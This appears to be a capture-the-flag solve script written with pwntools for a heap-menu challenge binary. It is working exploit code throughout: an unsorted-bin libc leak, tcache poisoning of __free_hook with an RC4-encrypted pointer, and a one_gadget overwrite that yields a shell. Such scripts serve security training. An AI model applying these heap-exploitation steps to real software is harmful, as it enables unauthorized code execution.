from pwn import *

from arc4 import ARC4

key_number = -1
content_number = -1


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def add_key(size):
    global key_number
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'item', str(size).encode())
    key_number += 1
    return key_number


def add_content(size):
    global content_number
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'item', str(size).encode())
    content_number += 1
    return content_number


def add_content_content(id_content, id_key, size, content):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'modify', str(id_content).encode())
    io.sendlineafter(b'with', str(id_key).encode())
    io.sendlineafter(b'content', str(size).encode())
    io.sendafter(b'content', content)


def add_key_content(id, size, content):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'modify', str(id).encode())
    io.sendlineafter(b'content', str(size).encode())
    io.sendafter(b'content', content)


def delete_content(id):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'remove', str(id).encode())

def delete_key(id):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'remove', str(id).encode())

def show_content(id):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'show', str(id).encode())
    io.recvline()
    io.recvline()
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    return leak


gdbscript = '''
breakrva 0x1be6
'''.format(**locals())

exe = './super_secure_heap_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]

############################################################
libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
############################################################
io = start()
############################################################
key = b'A' * 8
arc4 = ARC4(key)
#cipher = arc4.encrypt(b'A'*8)
############################################################

k_idx = add_key(9)
add_key_content(k_idx, 8, key)

lista = []
#pause()

for i in range(7):
    ctx = add_content(20)
    print(f"{ctx = }")
    lista.append(ctx)

c_idx_unsorted = add_content(2048)
add_content_content(c_idx_unsorted, k_idx, 1996, b'A' * 8)
c_idx1 = add_content(2048)
add_content_content(c_idx1, k_idx, 1996, b'A' * 8)

ctx = add_content(20)
print(f"{ctx = }")
lista.append(ctx)
for idx in lista:
    print(f"delete {idx}")
    delete_content(idx)

delete_content(c_idx_unsorted)

leak = show_content(c_idx_unsorted)
main_arena = leak - 96
libc.address = main_arena - 0x1ecb80

print(f"[+] main arena 0x{main_arena:x}  [+]")
print(f"[+] libc base  0x{libc.address:x} [+]")
delete_content(c_idx1)


for i in range(7):
    add_content(20)

arc4 = ARC4(key)
cipher = arc4.encrypt(flat(libc.symbols.__free_hook - 16))
add_content_content(9, k_idx, 8, cipher)

add_content(20)
#add_content(20)


add_key(20)


add_key_content(1, 8, flat(libc.address + 0xe3b01))

delete_key(0)


io.interactive()
